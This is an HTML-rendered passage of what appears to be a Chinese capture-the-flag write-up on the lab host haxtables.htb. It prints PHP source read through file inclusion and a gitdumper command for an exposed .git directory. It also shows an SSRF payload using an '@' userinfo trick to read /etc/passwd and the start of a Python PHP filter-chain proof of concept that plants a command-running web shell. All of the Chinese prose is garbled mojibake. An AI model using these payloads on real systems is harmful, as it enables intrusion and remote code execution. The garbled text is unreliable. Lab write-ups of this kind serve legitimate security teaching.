class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;uri_path&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo jsonify([&#x27;message&#x27; =&gt; file_get_contents(&#x27;php://input&#x27;)]);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">make_api_call</span>(<span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡ŒåŒ…å«äº†..&#x2F;api&#x2F;utils.phpæ–‡ä»¶ï¼Œä¹Ÿè¯»å–ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_included_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">jsonify</span>([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$post</span>));</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨handler.phpä¸­è°ƒç”¨äº†utils.phpä¸­çš„make_api_callå¯¹POSTä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†å¤„ç†ï¼Œé‡ç‚¹æŸ¥çœ‹make_api_callå‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$post</span>));</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$uri_pathæ‹¼æ¥åˆ°$urlä¸­ï¼Œå°†postä¼ å…¥çš„å‚æ•°ä¼ å…¥åˆ°æ‹¼æ¥åçš„urlä¸­ï¼Œå¹¶å‘èµ·è¯·æ±‚ï¼Œè¿”å›è¯·æ±‚ç»“æœã€‚</p><p>æ¥ç€æˆ‘ä»¬å†åˆ©ç”¨è¿™ä¸ªLFIæŸ¥çœ‹ä¸€ä¸‹image.haxtables.htbä¸­çš„æ–‡ä»¶ï¼Œæ–‡ä»¶ä½ç½®åœ¨&#x2F;var&#x2F;www&#x2F;image&#x2F;index.phpï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/coming_soon.html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒ…å«äº†utils.phpï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">jsonify</span>([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$status</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cd /var/www/image &amp;&amp; /usr/bin/git status&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_log</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;&#x27;</span> . <span class="title function_ invoke__">addslashes</span>(<span class="variable">$file</span>) . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$commit</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sudo -u svc /var/www/image/scripts/git-commit.sh&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$commit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºimageç›®å½•ä¸‹æ˜¯å­˜åœ¨ä¸€ä¸ª.gitçš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a href="https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385">gitdumper.sh</a>ä¸‹è½½.gitç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gitdumper.sh  http://image.haxtables.htb/.git/ image</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ä¸‹æ¥åï¼Œçœ‹åˆ°actions&#x2F;action_handler.phpæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd55f144a010073235f9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd55f144a010073235f9.jpg"></a></p><p>è¿™é‡ŒåŒ…å«äº†ä¼ å…¥çš„pageå‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¼ å…¥pageå‚æ•°çš„è¯ï¼Œé‚£ä¹ˆè¿™é‡Œå°†ä¼šæ˜¯ä¸€å¤„LFIæ¼æ´ã€‚å¯æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥è¿›å…¥<a href="http://image.haxtables.htb/actions/action/_handler.php%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%95%8C%E9%9D%A2%E4%BC%9A%E8%BF%94%E5%9B%9E403%E3%80%82%E9%82%A3%E4%B9%88%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E8%AF%A5%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8%E5%91%A2%EF%BC%9F">http://image.haxtables.htb/actions/action\_handler.phpï¼Œå› ä¸ºç•Œé¢ä¼šè¿”å›403ã€‚é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</a></p><p>å‡è®¾æˆ‘ä»¬å°†$url_pathæ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:a@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&amp;test=</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ‹¼æ¥åçš„urlå°†ä¼šå˜æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://api.haxtables.htba:a@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&amp;test=/index.php</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨@ç¬¦å·å°†å‰é¢çš„å†…å®¹æ„é€ æˆäº†ç”¨æˆ·åå’Œå¯†ç ï¼ŒçœŸæ­£è®¿é—®çš„hostå˜æˆäº†image.haxtables.htbï¼Œé‚£ä¹ˆå°±ä¼šæˆåŠŸåœ¨action_handler.phpä¸­ä¼ å…¥pageå‚æ•°ï¼Œå®ç°LFIï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd63f144a01007324e9f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd63f144a01007324e9f.jpg"></a></p><p>å¯æ˜¯ä»…æœ‰LFIä¼¼ä¹å¯¹æ‹¿åˆ°shellå¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œè¿™é‡Œæ¨èä¸€ä¸‹Zeddå¸ˆå‚…å‘å¸ƒçš„ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a>ã€‚ä»æœ€ç®€å•çš„LFIå¼€å§‹ï¼Œä¸€æ­¥æ­¥æ„é€ php filter chainä»è€Œå®ç°RCEï¼Œå¾ˆæ£’çš„æ–‡ç« ã€‚</p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9ce71f144a0100734695f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ce71f144a0100734695f.jpg"></a></p><p>åˆ©ç”¨ä»¥ä¸‹POCå¯æˆåŠŸRCEï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.135.131/include.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;include.php&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span 